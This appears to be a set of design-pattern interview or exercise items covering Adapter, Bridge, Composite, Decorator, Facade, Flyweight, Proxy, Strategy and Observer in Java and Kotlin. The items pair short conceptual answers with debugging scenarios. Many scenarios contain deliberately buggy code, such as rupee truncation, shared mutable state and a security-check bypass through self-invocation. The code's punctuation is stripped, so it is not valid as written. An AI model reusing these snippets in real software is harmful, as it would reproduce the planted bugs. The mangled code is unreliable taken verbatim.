Adapter makes a class I cannot or do not want to change fit the interface my client already expects. The adapter implements the target interface, holds the adaptee, and translates each call. It never changes the adaptee. InputStreamReader is one: it adapts a byte InputStream to the character Reader interface.

title: Money conversion in an adapter
text: Find the bug, fix it, and say what you would change in the adapter's contract. Checkout charges through a Stripe adapter. Finance reports that some orders are short by 1 paisa; for example a Rs 19.99 order settled as Rs 19.98. About 3% of orders are affected. Unit tests only used round prices such as 499.0. class StripeAdapter implements PaymentGateway { private final StripeSdk sdk; StripeAdapter StripeSdk sdk { this.sdk = sdk; } public boolean pay double rupees { return sdk.charge long rupees 100 , "inr" ; } }

title: Object vs class adapter
text: What is the difference between an object adapter and a class adapter, and which do you choose in Java and Kotlin? An object adapter holds the adaptee as a field composition . A class adapter extends the adaptee and implements the target. I use the object adapter almost always: it works with a final adaptee, can wrap subclasses of the adaptee, and does not expose the adaptee's methods to my client.

title: Requirement change
text: Which classes change, which do not, and where does the per-order choice go? Your app uses PaymentGateway with StripeAdapter . Product now wants Razorpay for Indian cards and PayPal for international ones, chosen per order. Razorpay SDK: createOrder int paise then capture String orderId . PayPal SDK: execute PayPalRequest where the amount is a String in major units like "19.99". The current code is: class CheckoutService { private final PaymentGateway gateway; CheckoutService PaymentGateway g { gateway = g; } boolean checkout double rupees { return gateway.pay rupees ; } }

title: Pointless adapter layers
text: What is wrong, what do you tell the author, and when would an adapter layer be justified here? In code review you see this for a feature that has 80 endpoints: class ApiService private val retrofit: UserApi { // same method names as UserApi suspend fun getUser id: String = retrofit.getUser id } class ApiAdapter private val service: ApiService { // same again suspend fun getUser id: String = service.getUser id } class ApiRepository private val adapter: ApiAdapter { // same again suspend fun getUser id: String = adapter.getUser id } Each new endpoint needs 4 edits. Estimated 15 minutes per endpoint of boilerplate.

title: Testing with a seam
text: How do you restructure it so the business logic is testable in milliseconds, and how do you still test the Stripe translation? CheckoutService is written like this and the team cannot unit test it without a Stripe sandbox key; the CI job takes 90 seconds and fails 1 run in 20 on network flakes. class CheckoutService { private final StripeSdk stripe = new StripeSdk "sk test ..." ; boolean checkout double rupees { if rupees <= 0 return false; return stripe.charge Math.round rupees 100 , "inr" ; } }

title: Bridge vs Strategy
text: Bridge and Strategy both use composition and an injected interface. How do you tell them apart, and when is Strategy enough? Strategy swaps one algorithm behind one interface: one axis. Bridge splits a class hierarchy into two hierarchies, abstraction and implementor, because both vary independently. If I have one thing that changes, it is Strategy; if I have two dimensions that would multiply classes, it is Bridge.

title: Class explosion
text: Refactor it. Which pattern, which classes, and how many classes do you have before and after the two requests? A notification module has grown by copy-paste: class UrgentSmsNotification { void notifyUser String u, String t { / sms http call / } } class UrgentEmailNotification { void notifyUser String u, String t { / smtp call / } } class DigestSmsNotification { / same sms code again / } class DigestEmailNotification { / same smtp code again / } // ... 3 types x 4 channels = 12 classes today Product wants WhatsApp next quarter, and a "Marketing" type after. Each channel's HTTP code is already duplicated 3 times and two copies have diverged one has a timeout, others do not .

title: Bridge vs Adapter
text: Adapter and Bridge both put an interface between a client and an implementation. What is different in intent, timing and structure, and can they appear together? Adapter is applied after the fact to make two existing, incompatible things work together. Bridge is a design decision made up front to keep two hierarchies, an abstraction and its implementations, independent. They combine well: I bridge my abstraction and write an adapter for each third-party implementor that does not fit my implementor interface.

title: Thread safety of the bridge
text: Name every concurrency defect and propose a safe design that still supports vendor failover. To support a "switch to backup SMS vendor" button, someone made the bridge mutable. In production at 2,000 notifications/s, after a failover a few messages show a body for one user and the recipient of another, and a stack trace shows an NPE twice a day. abstract class Notification { protected MessageSender sender; // swapped by an admin thread void setSender MessageSender s { this.sender = s; } abstract void notifyUser String user, String text ; } class UrgentNotification extends Notification { private String lastUser; // "for logging" void notifyUser String user, String text { lastUser = user; sender.deliver lastUser, " URGENT " + text ; } } // one shared UrgentNotification instance is used by all request threads

title: Do we need a Bridge
text: Do you accept the Bridge? Show the numbers and what triggers revisiting it. A report exporter has 1 report type today Sales and 3 output formats CSV, PDF, XLSX . A teammate proposes a Bridge: Report abstraction x Format implementor, with a "future-proof" ReportFactory . Roadmap, honestly: a second report type "maybe next year", formats stable. Team of 4, release every 2 weeks.

title: Adapter doing too much
text: List the problems and show the shape you would approve. You review a PR titled "Stripe adapter". The team lead notes the vendor changes its error shape often. class StripeAdapter implements PaymentGateway { private final StripeSdk sdk; StripeAdapter StripeSdk sdk { this.sdk = sdk; } public StripeCharge pay Order order throws StripeException { // returns vendor type if order.getTotal order.getUser .getCreditLimit // business rule throw new IllegalStateException "limit" ; for int i = 0; i < 3; i++ { // retry try { return sdk.charge order.getTotal , "inr" ; } catch StripeException e { Thread.sleep 500 ; } } log.info "card " + order.getCardNumber ; // logging return null; } }

title: Composite idea
text: What is the Composite pattern? Explain with a file system and with Android views. Composite lets a client treat a single object and a group of objects through one interface. A File is a leaf, a Folder holds a list of the same interface type, and size on a folder sums its children, recursively. Android's View is the component, ViewGroup the composite: measure and draw recurse down the tree.

title: Cycle in a tree
text: Explain the failure and fix it. A file manager lets users drag folders. After a user dragged "Projects" into its own subfolder "Projects/2024", the app freezes and then logs: java.lang.StackOverflowError at FolderNode.size FolderNode.java:9 at FolderNode.size FolderNode.java:9 ... 1024 more class FolderNode implements FsNode { private final List<FsNode children = new ArrayList< ; FolderNode add FsNode n { children.add n ; return this; } public long size { long s = 0; for FsNode c : children s += c.size ; return s; } }

title: Transparent vs safe composite
text: Should add and remove live on the Component interface or only on the Composite? Argue both sides and say what you would pick. Transparent puts add/remove on the interface so clients treat everything uniformly, but leaves must throw UnsupportedOperationException , a runtime failure. Safe puts them only on the composite, so the compiler protects you, but clients that build trees need the concrete type. I pick safe for most code, because mutation is usually done by a builder that knows it has a composite, while readers only need the shared interface.

title: instanceof tree walk
text: Refactor to remove the ladders, and say which pattern and why. An HR service computes cost for a manager hierarchy: double cost Object e { if e instanceof Developer d return d.salary; if e instanceof Designer d return d.salary + d.toolsBudget; if e instanceof Manager m { double sum = m.salary; for Object r : m.reports sum += cost r ; return sum; } throw new IllegalArgumentException ; } There are 4 other methods headcount, report, export... each with the same instanceof ladder. Adding "Contractor" needed edits in 5 places and one was missed, giving a wrong headcount in a board report.

title: Decorator vs inheritance
text: What does the Decorator pattern give you that subclassing does not? Use BufferedReader as the example. A decorator implements the same interface as the object it wraps, holds it, and adds behavior before or after delegating. Because layers are chosen at runtime and are stackable, I get n independent features with n classes. Subclassing needs a class per combination, up to 2^n , and fixes the choice at compile time.

title: Pricing add-ons
text: Redesign it. Which classes change when a new add-on arrives, and where does the discount go? A coffee app prices drinks with subclasses: Espresso , EspressoWithMilk , EspressoWithMilkAndCaramel , LatteWithCaramel , and so on: 23 classes today. Marketing wants an oat-milk option, a "double shot", and a 10% happy-hour discount that stacks with any add-ons but never applies to the loyalty reward drink. Two new add-ons a month are expected.

title: Wrapper order
text: What is wrong and what is the correct stack? Anything else you would check? A backup tool writes archives to disk. A new "secure backup" feature wraps the writer. Archive size went from about 12 MB to about 100 MB per 100 MB of data, and backups got slower by 4x, though the compression flag is on. Sink sink = new FileSink path ; sink = new CompressingSink sink ; // gzip sink = new EncryptingSink sink ; // AES sink.write data ; The data flows: caller - EncryptingSink - CompressingSink - FileSink.

title: Decorator overuse
text: Diagnose and propose a better structure. An HttpClient interface has 28 methods. A team built 9 decorators around it: auth, retry, logging, metrics, tracing, cache, circuit breaker, timeout, redirect. Log volume tripled to about 120 GB/day after a refactor, p99 rose from 180 ms to 260 ms, and a stack trace is 40 frames deep: at LoggingClient.get LoggingClient.java:31 at RetryingClient.get RetryingClient.java:44 at LoggingClient.get LoggingClient.java:31 <- second logging layer at MetricsClient.get ... ... 36 more wrapper frames Each decorator forwards all 28 methods by hand; 5 of them forgot to forward close , and file descriptors leak slowly.

title: Testing decorators
text: Describe the tests unit per decorator and one for the assembled chain and show the key one. You wrote RateLimitingSender max 2 messages per user , LoggingSender and TwilioAdapter as decorators of Sender . The team asks how to test without hitting Twilio, what to assert about the rate limiter, and how to prove that a blocked message is not logged or sent.

title: Decorator vs Composite
text: Decorator and Composite both have "a wrapper with the same interface as what it holds". How do they differ, and when would you combine them? Composite holds many children of the same type and aggregates their results to model a part-whole tree. Decorator holds exactly one inner and adds behavior to it. A decorator is like a composite with one child whose job is to add something, not to aggregate. I combine them to decorate a node anywhere in a tree, such as adding a border to any View , leaf or group.

title: Depth and cost of recursion
text: What do you change in the model and the code? A cloud storage dashboard shows "folder size" using a Composite: size recurses over the tree. It worked with 10,000 files. A customer now has 8 million files in a tree 400 levels deep generated paths . Dashboard requests for the root folder take 14 s, CPU is pegged, and a few requests die with StackOverflowError . The page is requested every 5 s per open dashboard and there are 300 open dashboards. GET /folders/root/size p50=11.2s p99=14.8s 60 rps, 5xx=3% jstack: 40 threads in FolderNode.size deep recursion

title: Decorating collections
text: synchronizedList is a Decorator. Explain what it guarantees, why these bugs happen, and fix them. A service keeps active sessions in List<String sessions = Collections.synchronizedList new ArrayList< because "it is thread-safe". Under load about 50 threads the logs show: java.util.ConcurrentModificationException at java.util.ArrayList$Itr.next at SessionReaper.cleanup SessionReaper.java:27 and duplicates appear in the list although the code checks first: if !sessions.contains id sessions.add id ; // check-then-act for String s : sessions { if expired s sessions.remove s ; } // reaper

title: Facade idea
text: What is the Facade pattern? Give a real example and say what it does not do. A Facade gives one simple entry point to a complicated subsystem. The client calls placeOrder ... ; the facade calls inventory, payment, shipping and notification in the right order, with the failure handling. It does not remove the subsystem: power users can still reach the parts. Android MediaPlayer and Spring JdbcTemplate are examples.

title: Integer cache
text: Why does this behave differently for 100 and 1,000, and how do you fix it? A pricing service compares quantities. In tests, orders of quantity 100 match; in production an order of quantity 1,000 never matches its limit and is rejected. Integer limit = Integer.valueOf 1000 ; Integer qty = order.getQuantity ; // returns Integer 1000 if qty == limit { approve order ; } // never true for 1000, true for 100

title: Facade vs Adapter
text: A teammate says "our PaymentService is an adapter". Another says "no, a facade". How do you decide which pattern a wrapper is, and does it matter? I ask two things: how many classes does it wrap, and who defined the interface it exposes? Adapter converts one existing interface into the one the client already expects. Facade invents a new simpler interface over several classes. A wrapper over one vendor SDK that implements my PaymentGateway is an Adapter; OrderFacade over inventory, payment and shipping is a Facade.

title: Repeated recipe
text: Refactor it and show how you would unit test the new class. Twelve screens place orders with this recipe copy-pasted. Support finds that stock is "reserved forever" for some failed payments about 0.4% of orders, 600 units stuck this month . One screen sends the email before shipping. inventory.reserve sku, qty ; payment.charge card, amount ; // can throw PaymentException shipping.create address, sku ; email.send user, "Order placed" ;

title: Intrinsic vs extrinsic state
text: Explain the Flyweight pattern. What are intrinsic and extrinsic state, and why must a flyweight be immutable? Flyweight saves memory by sharing the common, unchanging part of many similar objects. Intrinsic state is shared and stored in the flyweight, for example a tree's texture and mesh; extrinsic state varies per use and is passed in or held by the context, such as x and y. A factory returns one flyweight per key. It must be immutable because a change to a shared object changes it for every user.

title: Memory budget
text: Redesign the model, compute the new memory, and say what you would measure first. A map app shows up to 200,000 markers pins at once. Each pin object holds lat , lon , a title , and an Icon object with a 64 KB decoded bitmap. There are 12 distinct icon kinds restaurant, fuel, ATM... . Memory today: 200,000 pins x 64 KB icon + 50 B fields = 12.8 GB - OutOfMemoryError on a 4 GB heap The icon is never modified after load.

title: Pool thread safety
text: Explain both symptoms and fix them without losing the sharing. A text renderer shares one Glyph flyweight per character through a factory. Under a 32-thread export job the process occasionally hangs at 100% CPU, and sometimes two different Glyph objects exist for the same character heap dump shows 3 instances of Glyph 'e' . final class GlyphFactory { private static final Map<Character, Glyph POOL = new HashMap< ; static Glyph get char c { Glyph g = POOL.get c ; if g == null { g = new Glyph c ; POOL.put c, g ; } // loads a 40 KB shape return g; } } jstack: 6 threads RUNNABLE at java.util.HashMap.getNode / HashMap.put resize

title: God facade
text: How do you break it up safely, and what design rule stops it growing back? AppFacade started as a clean entry point. It now has 60 methods across orders, refunds, users, reports and admin tools, 3,800 lines, and is injected into the web app, the mobile API and the admin panel. Last quarter, 41 of 55 merged PRs touched it, with weekly merge conflicts. A refund change broke a report method because both share a private cache field. git log --since=3.months -- AppFacade.java grep -c commit - 41

title: Mutable shared flyweight
text: Why does this happen, and how do you model frozen state correctly? A game shows 5,000 enemies of type "Goblin" sharing one EnemyType flyweight. A designer adds a feature "frozen enemies turn blue". After a freeze spell on one goblin, every goblin on screen turns blue, and QA files "freeze spell affects all enemies". final class EnemyType { String name; Color color; Sprite sprite; } // shared per kind class Enemy { final EnemyType type; int x, y; void freeze { type.color = Color.BLUE; } }

title: Premature pooling
text: Review the change. Should it ship? To "reduce GC" on an Android feed, a teammate pooled Point x, y objects 24 bytes each behind a synchronized PointPool . Frame stats after the change: before: alloc 18 MB/s, GC pauses avg 2 ms, jank frames 1.1% after : alloc 17 MB/s, GC pauses avg 2 ms, jank frames 2.9%, PointPool.acquire avg 40 ns lock contention Allocation of a small object costs about 10 ns on the same device. The pool also has a bug where a point released twice is handed to two callers.

title: Facade across services
text: What changes in the facade, and how do you migrate without losing consistency? The monolith OrderFacade calls 4 modules in-process in one DB transaction. You are splitting inventory, payment and shipping into services over a quarter, with live traffic at about 300 orders/min. A partial run showed: reserve OK - charge OK - shipping HTTP timeout 3 s - facade throws - client retries result: customer charged twice on retry, stock reserved twice for 37 orders

title: Flyweight vs cache vs pool
text: How is Flyweight different from a cache and from an object pool, and when does each one apply? Flyweight shares identical immutable objects to save memory. A cache stores computed results to avoid recomputation or I/O and needs invalidation. An object pool reuses mutable, expensive-to-create objects such as connections, handing out one at a time and taking it back. Flyweight is about many users of one object at once; a pool is exclusive use; a cache is about stale versus fresh data.

title: Proxy and its four kinds
text: What is the Proxy pattern? Name the four classic kinds and one real library example for each. A Proxy is a stand-in with the same interface as the real object that controls access to it, so the client cannot tell the difference. Virtual proxy delays creating something expensive Hibernate lazy loading . Protection proxy checks permissions Spring Security @PreAuthorize . Remote proxy hides the network Retrofit service, gRPC stub . Caching proxy answers repeats from memory OkHttp Cache , @Cacheable .

title: Lazy proxy failure
text: Explain the error and give two fixes. After a refactor, a REST endpoint that returns a user's orders fails in production but passes in unit tests with mock data. org.hibernate.LazyInitializationException: failed to lazily initialize a collection of role: User.orders, could not initialize proxy - no Session at UserController.toDto UserController.java:42 User u = userService.find id ; // service method is @Transactional; session closes on return return new UserDto u.getName , u.getOrders ; // controller touches the lazy list

title: Proxy vs Decorator vs Adapter
text: Proxy, Decorator and Adapter all wrap one object. How do you tell them apart on a code review, and what test would you apply to a wrapper that checks permissions? The test is interface and intent. Adapter exposes a different interface than it wraps to make things fit. Decorator exposes the same interface and adds behavior. Proxy exposes the same interface and controls access to the subject: lazy creation, permission, remote call, cache. A wrapper that checks permissions before forwarding is a Proxy, because its job is to gate the call, not to add a feature.

title: Self-invocation bypasses the proxy
text: Why does bulkExport bypass the check and how do you fix it properly? A Spring service secures an admin action with a method annotation. An audit finds that a normal user could trigger the refund through the public export endpoint. @Service class RefundService { public void bulkExport List<String ids { // no security annotation for String id : ids refund id ; // internal call } @PreAuthorize "hasRole 'ADMIN' " public void refund String id { / moves money / } } Calling refundService.refund "x" from a controller as a normal user is correctly rejected with 403.

title: Remote proxy hazards
text: A remote proxy such as a Retrofit interface makes a network call look like a local method. What are the risks of that illusion and how do you design around them? A remote call can be slow, fail, time out, or succeed without the caller knowing, so treating it as a local call causes bugs. I set explicit timeouts, return a result type or error types, retry only idempotent calls with an idempotency key for writes , keep calls off the UI thread, and avoid chatty fine-grained interfaces because 1,000 calls at 50 ms is 50 seconds.

title: Testing a caching proxy
text: Make it testable and describe the tests that matter. You wrote CachingRates TTL 60 s in front of a paid currency service about 120 ms and $0.001 per call . The test in CI sleeps 61 seconds to check expiry and sometimes fails because of timing; coverage for "does it call the service once for repeats" is missing. class CachingRates implements Rates { private final Rates real; private final long ttlMs; public double rate String pair { long now = System.currentTimeMillis ; // hidden dependency on the clock / ... / } }

title: Cache stampede
text: Explain the pattern, name the fixes in order, and say what you would not do. A CachingRates proxy TTL 60 s fronts a pricing service that handles 400 rps at most. Every minute on the minute, the pricing service melts for a few seconds. 12:00:00 cache expires for key USD-INR 12:00:00.0-0.9 pricing-service rps: 410 p99: 9.8 s errors: 31% 12:00:01 recovered app: 1,800 rps on USD-INR across 40 pods, each pod has its own cache

title: Interceptor order
text: Explain the symptoms in terms of order and fix the chain. An OkHttp client is built like this. After release, a security scan finds bearer tokens in logs, and the backend sees duplicate POST /orders requests whenever it answers 503. val client = OkHttpClient.Builder .addInterceptor AuthInterceptor { token } .addInterceptor HttpLoggingInterceptor .apply { level = HttpLoggingInterceptor.Level.HEADERS } .addInterceptor RetryInterceptor maxAttempts = 3 .cache Cache cacheDir, 10L 1024 1024 .build INFO -- GET /profile INFO Authorization: Bearer eyJhbGciOi... <- token in logs

title: Double charge through a retry proxy
text: Explain the failure, stop the bleeding and fix it end to end. A mobile app uses a Retrofit service for payments. On poor networks some users report two charges. Server logs: POST /charge order=9921 t=0.0s - processed, response lost client read timeout at 3s POST /charge order=9921 t=3.1s - processed again interface PaymentsApi { @POST "charge" suspend fun charge @Body req: ChargeRequest : ChargeResponse } // client: retryOnConnectionFailure true , custom RetryInterceptor maxAttempts = 3 on all methods Support counts about 60 double charges in a week out of 40,000 payments.

title: Consuming a response body
text: Why does it break callers and how do you write it correctly? A teammate adds a "log the response body" interceptor. After release, JSON parsing fails randomly and an IllegalStateException: closed shows up in crash reports for only some requests. class BodyLogger : Interceptor { override fun intercept chain: Interceptor.Chain : Response { val response = chain.proceed chain.request Log.d "HTTP", response.body!!.string // consumes the stream return response // caller now gets a closed body } }

title: How a chain works
text: Explain how an interceptor chain works internally, how a step short-circuits, and the difference between OkHttp application and network interceptors. Each step receives the request and a chain object. Calling chain.proceed request runs the rest of the steps and finally the real handler, then control returns back up so each step can act on the response. A step that does not call proceed short-circuits, for example an auth step returning 401. In OkHttp, application interceptors run once per call and see the final response; network interceptors run per network attempt and see redirects and retries, and do not run when the cache answers.

title: Lazy creation race
text: Explain the bug and give a fix that loads once, with the trade-offs of each option. A report screen shares one ReportProxy per report across request threads. The real report loads a 300 MB dataset on first use. After a traffic spike the heap hits 3.4 GB and logs show: INFO loading dataset for report 77 thread http-12 INFO loading dataset for report 77 thread http-19 INFO loading dataset for report 77 thread http-31 GC overhead: 3 x 300 MB live copies of report 77 class ReportProxy implements Report { private RealReport real; // lazy public Data data { if real == null real = new RealReport id ; // 300 MB load, 4 s return real.data ; } }

title: Adapter vs Decorator vs Proxy
text: Adapter, Decorator and Proxy all wrap one object and look identical in a UML diagram. How do you tell them apart? I ask two questions. Does the wrapper expose a different interface from the wrapped object? Then it is an Adapter. Same interface: is it adding behavior Decorator or controlling access to the object Proxy ? Shape is the same, intent differs.

title: Composite vs Facade
text: Composite, Decorator, Facade and Flyweight all "hold other objects". What does each hold and why? Composite holds many children of the SAME type in a tree, so one and many are treated uniformly. Decorator holds ONE inner of the same type in a chain to add behavior. Facade holds several DIFFERENT subsystem classes to simplify use. Flyweight is a pool of shared immutable parts to save memory.

title: Choosing a pattern
text: Pick a pattern for each and justify it in one line. Four small requirements land in one sprint. a Your code expects PaymentGateway.pay amount , but a new vendor SDK offers Client.charge cents, currency, metadata . b A file explorer shows folders containing files and other folders; "total size" must work on either. c The app calls five classes in a fixed order to place an order, and three screens duplicate that recipe. d You must add optional encryption and compression to a byte stream, in any combination.

title: Decorator ordering
text: Find the problems in this wiring and fix it. Support reports: after a release, the vendor bill for SMS went up 40% and a user with a limit of 2 messages per day got 6. The wiring was changed in a refactor. tab Sender chain = new LoggingSender new TwilioAdapter new RateLimitingSender new RealSdkSender , 2 ; // RateLimitingSender now wraps the vendor SDK call; Adapter and Logging sit above it NotificationFacade facade = new NotificationFacade chain ; tab val chain = LoggingSender TwilioAdapter RateLimitingSender RealSdkSender , 2 Logs show "send to 9876543210 ok=false" for blocked calls, and the vendor dashboard shows retries by the app's caller.

title: Facade + Adapter
text: Refactor: which classes appear and which patterns do they represent? CheckoutService is 900 lines. It imports a card SDK, a UPI SDK and an SMS SDK, calls them directly, and has if method.equals "UPI" branches in 14 places. Product wants a third payment method next month, and unit tests need real sandbox keys. tab class CheckoutService { boolean pay String method, long paise, String user { if method.equals "CARD" { CardSdk c = new CardSdk KEY ; return c.authorize paise / 100.0, "INR" .ok; } else if method.equals "UPI" { return new UpiSdk .collect user + "@upi", int paise .status == 1; } throw new IllegalArgumentException method ; } } tab class CheckoutService { fun pay method: String, paise: Long, user: String : Boolean = when method { "CARD" - CardSdk KEY .authorize paise / 100.0, "INR" .ok "UPI" - UpiSdk .collect "$user@upi", paise.toInt .status == 1 else - throw IllegalArgumentException method } }

title: Requirement change
text: Which classes change, which are added, and where does each new piece sit in the chain? The notification chain is NotificationFacade - RateLimit - Logging - TwilioAdapter - TwilioSdk . Product now wants: 1 email as a second channel using a different vendor SDK; 2 metrics success and latency per channel ; 3 fall back to email if SMS fails.

title: Rule of three and over-engineering
text: When do you introduce a structural pattern, and when do you deliberately not? I start without a pattern and add one when a real pain shows up, usually the second or third concrete case rule of three . I name the pain first: mismatch, two axes, tree, layers, simplify, memory, access. If I cannot name it, I do not add the pattern, because each one adds classes, indirection and a place to debug.

title: Kotlin delegation vs Decorator
text: Kotlin's by keyword generates a decorator for you. What are its limits and gotchas? class A inner: I : I by inner generates forwarding methods for every interface member, so I override only what I change. The gotcha: calls made inside the inner object to its own other methods do NOT go through my wrapper, and delegation works only for interfaces, not classes.

title: Flyweight
text: What do you do, and what do you check before and after? A map-rendering service keeps 2,000,000 Marker objects in memory. Each stores x , y , a 64x64 icon as byte 16384 , a String name and a Color . Heap use is 36 GB across the fleet, GC pauses reach 900 ms. There are only 40 distinct icons.

title: Concurrency in decorators
text: Explain every symptom and fix it properly. The notification service now runs on 6 pods with 32 request threads each. The rate-limit decorator is the one from the demo: a HashMap<String,Integer counter, limit 5 per user per minute. Symptoms: occasional ConcurrentModificationException and an infinite loop in HashMap.get pinning 2 cores a known failure mode of unsynchronized HashMap in older JVMs; verify for your version ; a user still got 22 messages in one minute; counts never reset. tab private final Map<String, Integer counts = new HashMap< ; public boolean send String user, String text { int c = counts.merge user, 1, Integer::sum ; if c maxPerUser return false; return inner.send user, text ; } tab private val counts = HashMap<String, Int override fun send user: String, text: String : Boolean { val c = counts.merge user, 1, Int::plus !! return c <= max && inner.send user, text }

title: Testability
text: What do you change and what tests do you write for each layer? QA asks how you will test the notification chain without calling Twilio and without sleeping for a real minute. Today TwilioAdapter does new TwilioSdk System.getenv "KEY" inside its constructor and RateLimitingSender calls System.currentTimeMillis .

title: Proxy and Decorator pitfalls
text: List what is wrong and say what you would request in the review. You review this PR adding caching and retry to a UserApi used by a repository. The wrapper stack is Repository Facade - RetryApi - CachingApi - RetrofitApi . tab class CachingApi implements UserApi { private final UserApi inner; private final Map<String, User cache = new HashMap< ; public User get String id { return cache.computeIfAbsent id, inner::get ; } public void update User u { inner.update u ; } // cache not touched } class RetryApi implements UserApi { private final UserApi inner; public User get String id { return retry 3, - inner.get id ; } public void update User u { retry 3, - { inner.update u ; return null; } ; } } tab class CachingApi private val inner: UserApi : UserApi { private val cache = HashMap<String, User override fun get id: String = cache.getOrPut id { inner.get id } override fun update u: User = inner.update u // cache not touched } class RetryApi private val inner: UserApi : UserApi { override fun get id: String = retry 3 { inner.get id } override fun update u: User = retry 3 { inner.update u } }

title: Strategy basics
text: What is the Strategy pattern and what problem does it solve? I put each variant of an algorithm behind one interface and let the caller hold a reference to it. Instead of if type == A ... else if type == B ... inside the caller, I swap the object. New variant means a new class; the caller is not edited. It is Open/Closed in practice.

title: Template Method basics
text: Explain the Template Method pattern. Who controls the flow? A base class defines the skeleton of an algorithm in a final method and calls abstract or hook steps that subclasses fill in. The base class controls the order; subclasses only supply the varying steps. "Don't call us, we'll call you."

title: Strategy vs Template Method
text: Strategy and Template Method both vary behaviour. When do you pick which? Template Method varies steps by inheritance, fixed at compile time, with the base class owning the flow. Strategy varies the whole algorithm by composition and can change at runtime. I default to Strategy or a lambda; I use Template Method only when I own a framework skeleton that must enforce a step order.

title: Strategy in real libraries
text: Give real examples of Strategy in the JDK or Android, and explain why they count. Comparator passed to Collections.sort is the textbook case: same sort algorithm, swappable comparison. In Android, a Hilt-bound interface real vs fake repository or RecyclerView.LayoutManager swaps layout behaviour; Retrofit converters and OkHttp Dns are also pluggable policies.

title: Strategy refactor
text: Refactor it. Which classes appear, and what changes when BNPL arrives? A checkout method is 240 lines with six payment branches. Two bugs this quarter came from edits to one branch breaking another. Product wants a seventh method BNPL next sprint. double pay Order o, String type { if type.equals "CARD" { / 40 lines / } else if type.equals "UPI" { / 40 lines / } else if type.equals "WALLET" { / 40 lines / } // ... 3 more else throw new IllegalArgumentException type ; return o.total ; }

title: Open/Closed with Strategy
text: Which classes change, and how do you avoid breaking existing strategies? Pricing code has DiscountStrategy with PercentOff and FlatOff . Marketing asks for "buy 3 get cheapest free", which needs the cart lines, not just the total. The current signature is double apply double total .

title: Stateful strategy
text: Find the bug and fix it. A rate limiter strategy is a Spring singleton shared by all requests. Under load, some users get wrong "retry after" values. Code: class BackoffRetry implements RetryPolicy { private int attempt = 0; // field on a shared singleton public long delayMs { attempt++; return 100L << attempt; } } Metrics: p99 retry delay hits 52 minutes at 300 rps; unit tests pass.

title: When not to use Strategy
text: Do you approve? What do you ask for instead? In code review a teammate wrote ShippingStrategy , FreeShipping , PaidShipping , ShippingStrategyFactory and a config class for one rule: shipping is free over 500. The rule has not changed in three years and has no variants planned.

title: Template Method pitfalls
text: Explain the failure and fix the design. A base class calls an overridable hook from its constructor. A subclass NPEs in production only for one subclass. abstract class Report { Report { init ; } protected abstract void init ; } class SalesReport extends Report { private final List<String cols = new ArrayList< ; // initialised after super protected void init { cols.add "region" ; } // NPE } Stack trace: NullPointerException at SalesReport.init SalesReport.java:6 .

title: Template to Strategy
text: How do you refactor, and how do you test it after? DataImporter has an abstract parse with 5 subclasses CSV, JSON, XML, ... . A test for the shared save logic requires a throwaway subclass, and a new requirement says "choose the parser per file at runtime from the extension".

title: Template Method in Android
text: Mitigate, find the root cause, and prevent a repeat. After a refactor, 1.8% of sessions crash on launch. Crashlytics: SuperNotCalledException: Activity BaseActivity did not call through to super.onCreate . A new BaseActivity introduced a protected abstract int layoutId and overrides onCreate : override fun onCreate b: Bundle? { setContentView layoutId // forgot super.onCreate b } Rollout is at 20% of users.

title: Strategy selection and testing
text: Design the class model and testing approach. A notification-ranking feature uses three algorithms recency, relevance, ML-based . Product wants A/B experiments choosing the algorithm per user, with a kill-switch, and QA needs deterministic tests.

title: Observer basics
text: What is the Observer pattern, and what are its roles? A subject keeps a list of observers and notifies them when its state changes. The subject only knows an Observer interface, so it does not depend on who listens. New listener means subscribe; the subject is not edited.

title: Observer vs pub/sub
text: How does pub/sub differ from Observer? In Observer, observers register directly with the subject, so they know each other's type. In pub/sub a broker topic or event bus sits between publishers and subscribers; neither knows the other and subscribers filter by topic or event type. Pub/sub decouples more, but makes flow harder to trace.

title: Kotlin Flow as Observer
text: Compare Flow, StateFlow, SharedFlow and LiveData as observer mechanisms. A plain Flow is cold: each collector starts its own producer. StateFlow is hot, always holds a current value and replays it to new collectors, good for UI state. SharedFlow is hot with configurable replay, good for one-off events. LiveData is lifecycle-aware and Android-only; Flow plus repeatOnLifecycle replaces it.

title: Mediator
text: What is the Mediator pattern and how is it different from Observer? A mediator is a central object that coordinates a group of colleagues so they do not reference each other directly. N-to-N links become N-to-1. Observer is one-way notification with no coordination logic; a mediator holds the interaction rules when A changes, enable B and hide C .

title: Listener leaks
text: Explain the leak and fix it. Memory profile shows HomeActivity instances growing after each rotation heap dump: 14 instances retained, 9 MB each . Code: object LocationBus { private val listeners = mutableListOf< Location - Unit fun register l: Location - Unit { listeners.add l } } class HomeActivity : AppCompatActivity { override fun onCreate b: Bundle? { super.onCreate b LocationBus.register { loc - label.text = loc.toString } // captures this } } LeakCanary trace: LocationBus.listeners - lambda - HomeActivity .

title: Reentrancy and iteration
text: Why does it crash, and what are the options? Intermittent crash in production: ConcurrentModificationException at ArrayList$Itr.next inside EventSource.fire . Code: class EventSource { private final List<Listener ls = new ArrayList< ; void add Listener l { ls.add l ; } void remove Listener l { ls.remove l ; } void fire Event e { for Listener l : ls l.on e ; } } // a one-shot listener removes itself inside on

title: Callbacks to typed stream
text: Refactor to a typed stream and say what you gain and risk. A Downloader takes onProgress , onSuccess , onError callbacks. Callers nest them, miss error paths, and forget to detach in onDestroy . Three screens show the same download.

title: Open/Closed with Observer
text: What do you change so that adding the fourth channel later touches no existing class? What do you refuse to put behind the observer? OrderService.place currently calls emailService.send and inventory.reserve directly. Product now wants an SMS, a Slack alert for big orders, and an analytics event.

title: Event bus spaghetti
text: Diagnose and fix, and say whether you keep the bus. An in-app event bus has 70 event types. After a release, the "Cart" badge shows stale counts in 3% of sessions. Logs show: CartUpdated received by 5 subscribers; handler order: Badge, Pricing, Badge . The Badge subscribes twice once in onCreate , once in onResume . A PriceChanged handler posts CartUpdated again.

title: Flow collection lifecycle
text: List every bug and the corrected design. A screen consumes viewModel.state and viewModel.events . QA reports: after rotation the "Saved" snackbar appears again; the app also drains battery because location updates continue after the app goes to background. Code: lifecycleScope.launch { viewModel.state.collect { render it } viewModel.events.collect { show it } // never reached } events is a MutableStateFlow<Event? .

title: Slow subscribers and deadlock
text: Explain both problems and the redesign. A price feed publishes 5,000 updates/s synchronously on its single thread. One subscriber writes to a database 8 ms per call . Feed lag reaches 40 s; a thread dump shows the feed thread BLOCKED on Portfolio.lock held by a listener thread waiting on PriceFeed.lock . "feed" waiting to lock Portfolio@3a held by "ui" "ui" waiting to lock PriceFeed@1f held by "feed"

title: Mediator design
